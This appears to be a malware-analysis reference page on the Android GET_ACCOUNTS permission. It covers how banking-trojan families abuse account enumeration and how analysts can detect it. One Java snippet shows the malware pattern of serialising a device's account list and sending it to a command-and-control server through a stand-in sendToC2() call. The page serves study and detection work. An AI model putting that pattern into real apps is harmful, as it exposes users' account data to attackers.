# GET_ACCOUNTS

Allows listing the accounts registered on the device (Google, Samsung, Exchange, etc.). Reveals which services the user has accounts with, useful for targeted phishing and account enumeration.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.GET_ACCOUNTS` |
| Protection Level | `dangerous` |
| Permission Group | `CONTACTS` |
| Grant Method | Runtime permission dialog |
| Introduced | API 1 |

## What It Enables

```java
AccountManager am = AccountManager.get(context);
Account[] accounts = am.getAccounts();
for (Account account : accounts) {
    String type = account.type;   // "com.google", "com.samsung.account", etc.
    String name = account.name;   // email address or username
}
```

Returns account type and name (typically email address) for all accounts on the device.

## Abuse in Malware

### Email Harvesting

Extract email addresses associated with device accounts. These are confirmed valid addresses tied to a real person.

### Service Identification

Account types reveal which services the user uses: Google, Microsoft Exchange (corporate), Samsung, Facebook, banking apps with account integration.

### Targeted Phishing

Knowing the exact email addresses allows crafting targeted phishing emails that reference the victim's actual account.

### Account Enumeration for Overlay Targeting

Banking trojans use `GET_ACCOUNTS` to determine which financial services the victim uses, then load the corresponding overlay injection pages from C2. This avoids downloading inject templates for all targets and reduces network footprint.

```java
AccountManager am = AccountManager.get(context);
Account[] accounts = am.getAccounts();
ArrayList<String> accountTypes = new ArrayList<>();
for (Account account : accounts) {
    accountTypes.add(account.type);
}
JSONObject payload = new JSONObject();
payload.put("accounts", new JSONArray(accountTypes));
payload.put("bot_id", deviceId);
sendToC2(payload.toString());
```

### Notable Families

| Family | GET_ACCOUNTS Usage |
|--------|-------------------|
| [Cerberus](../../malware/families/cerberus.md) | `getAccounts` C2 command steals all accounts stored on device |
| [Alien](../../malware/families/alien.md) | Inherited `getAccounts` command from Cerberus fork; exfiltrates account list to C2 |
| [Ermac](../../malware/families/ermac.md) | `getAccounts` bot command steals device accounts via `AccountManager` |
| [Hook](../../malware/families/hook.md) | Inherited all 30 Ermac commands including `getAccounts` for account theft |

The entire [Cerberus](../../malware/families/cerberus.md) lineage -- Cerberus, [Alien](../../malware/families/alien.md), [Ermac](../../malware/families/ermac.md), [Hook](../../malware/families/hook.md) -- includes a dedicated `getAccounts` bot command. This command calls `AccountManager.getAccounts()`, serializes the results, and sends them to C2. The stolen account list serves two purposes: identifying high-value targets (users with banking or crypto accounts) and harvesting email addresses for further phishing campaigns.

## Android Version Changes

**Android 6.0 (API 23)**: became a runtime permission. Prior to this, any app could silently enumerate all accounts at install time.

**Android 8.0 (API 26)**: `GET_ACCOUNTS` is no longer required for accessing accounts belonging to the same developer (same package signature). Apps can access their own accounts without this permission. This change reduced the number of legitimate apps requesting the permission, making its presence more suspicious.

**Android 10 (API 29)**: contacts and account-related permissions were further separated. `GET_ACCOUNTS` no longer automatically grants access to contact data.

**Android 11 (API 30)**: `GET_ACCOUNTS` provides limited data. Many account types restrict visibility to protect user privacy. Account authenticators can now declare their accounts as not visible to third-party apps.

**Android 14 (API 34)**: further restrictions on cross-app account visibility. The trend has been to progressively limit what `GET_ACCOUNTS` reveals, though older devices remain fully exposed.

## Detection

In the manifest:

```xml
<uses-permission android:name="android.permission.GET_ACCOUNTS" />
```

Decreasingly useful due to Android restrictions. Modern malware uses other methods for account enumeration.

### Static Analysis Indicators

- Calls to `AccountManager.get(context).getAccounts()` or `getAccountsByType()`
- Serialization of `Account` objects into JSON or other wire formats
- Account data passed to network transmission methods

### Dynamic Analysis Indicators

- App accesses `AccountManager` immediately after launch or permission grant
- Account type strings ("com.google", "com.samsung.account") appearing in network traffic
- Email addresses from device accounts in exfiltrated data

### Permission Combination Red Flags

`GET_ACCOUNTS` combined with `INTERNET` and no visible account management UI is a strong indicator of reconnaissance. When combined with [SYSTEM_ALERT_WINDOW](../special/system-alert-window.md) or [BIND_ACCESSIBILITY_SERVICE](../special/bind-accessibility-service.md), it suggests the app enumerates accounts to select which overlay targets to deploy.
